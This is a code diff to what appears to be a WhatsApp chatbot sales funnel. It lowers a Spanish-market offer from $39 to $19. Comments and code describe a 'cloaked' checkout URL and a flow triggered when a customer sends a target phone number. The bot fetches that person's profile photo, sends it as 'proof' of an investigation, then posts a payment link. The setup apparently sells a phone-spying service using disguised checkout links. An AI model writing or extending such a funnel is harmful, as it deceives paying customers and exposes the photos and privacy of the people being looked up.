@@ -441,17 +441,17 @@ function buildSpanishCheckoutUrl(baseUrl, leadCode = 'lead') {
 function getCurrentStageInfo(stageKey, funnel, language = 'pt', leadCode = 'lead') {
   const lang = (language || 'pt').toLowerCase();
 
-  // No funil em espanhol: oferta única front-end de $39 USD com camuflagem de Upsell (CenterPag)
+  // No funil em espanhol: oferta única front-end de $19 USD com camuflagem de Upsell (CenterPag)
   if (lang === 'es') {
     const rawUrl = funnel.checkoutUrlEs || funnel.checkouts?.es?.frontUrl || 'https://go.centerpag.com/PPU38CQG5EL';
     const cloakedCheckout = buildSpanishCheckoutUrl(rawUrl, leadCode);
     return {
       stage: stageKey || 'stage_49',
-      value: '39',
+      value: '19',
       checkoutUrl: cloakedCheckout,
       nextStage: null,
       nextValue: null,
-      paidValue: stageKey === 'stage_finalizado' ? '39' : '0'
+      paidValue: stageKey === 'stage_finalizado' ? '19' : '0'
     };
   }
 
@@ -649,7 +649,7 @@ async function executeFlowGraph(instance, cleanPhone, messageText, mediaAttachme
     chatData.upsellStage = 'stage_49';
     chatData.currentNodeId = null;
     chatData.orderStatus = null;
-    chatData.variables = { phone: cleanPhone, checkoutUrl: chatData.variables.checkoutUrl, valor_atual: '39' };
+    chatData.variables = { phone: cleanPhone, checkoutUrl: chatData.variables.checkoutUrl, valor_atual: '19' };
     lastBotReplyTimestamps.delete(cleanPhone);
     lastPhysicalSendTimes.delete(cleanPhone);
 
@@ -690,9 +690,9 @@ async function executeFlowGraph(instance, cleanPhone, messageText, mediaAttachme
     chatData.upsellStage = 'stage_finalizado';
     chatData.orderStatus = 'PAGO';
     db.saveChat(cleanPhone, { state: 'FINALIZADO', orderStatus: 'PAGO', upsellStage: 'stage_finalizado' });
-    db.confirmAttributionSale(cleanPhone, 39);
+    db.confirmAttributionSale(cleanPhone, 19);
     eventBus.emit('new_sale', {
-      amount: 39,
+      amount: 19,
       currency: 'USD',
       phone: cleanPhone,
       code: accessCode,
@@ -706,7 +706,7 @@ async function executeFlowGraph(instance, cleanPhone, messageText, mediaAttachme
   // 2. DETECÇÃO INCONDICIONAL DE NÚMERO ALVO PARA INVESTIGAÇÃO (PRIORIDADE ALTA)
   // Se a mensagem contiver um número de telefone com 8 a 15 dígitos,
   // executa IMEDIATAMENTE o fluxo visual completo:
-  // node-analyzing-msg -> Delay 3s -> Consulta Foto (Uazapi) -> Envia Prova -> Oferta $39 -> Instrução
+  // node-analyzing-msg -> Delay 3s -> Consulta Foto (Uazapi) -> Envia Prova -> Oferta $19 -> Instrução
   // =========================================================================
   const detectedTargetDigits = extractNewTargetPhone(rawMsg);
 
@@ -779,11 +779,11 @@ async function executeFlowGraph(instance, cleanPhone, messageText, mediaAttachme
     eventBus.emit('chat_updated', { phone: cleanPhone });
 
     // PASSO E: Envia Oferta Inicial de $39 (node-offer-pix-49)
-    const fallbackOffer = "Enlace para el pago de $39 👇\n{checkoutUrl}\n\nDatos del pago: 🔒 Pago 100% seguro y encriptado.";
+    const fallbackOffer = "Enlace para el pago de $19 👇\n{checkoutUrl}\n\nDatos del pago: 🔒 Pago 100% seguro y encriptado.";
     const offerText = getNodeText('node-offer-pix-49', fallbackOffer);
     const finalOffer = interpolateVariables(offerText, chatData.variables);
 
-    console.log(`[FlowEngine] 📤 Enviando link de oferta $39...`);
+    console.log(`[FlowEngine] 📤 Enviando link de oferta $19...`);
     db.addChatMessage(cleanPhone, { from: 'bot', text: finalOffer, instanceId: inst.id });
     await sendOutgoingTextMessage(inst, cleanPhone, finalOffer, 1500);
     eventBus.emit('chat_updated', { phone: cleanPhone });
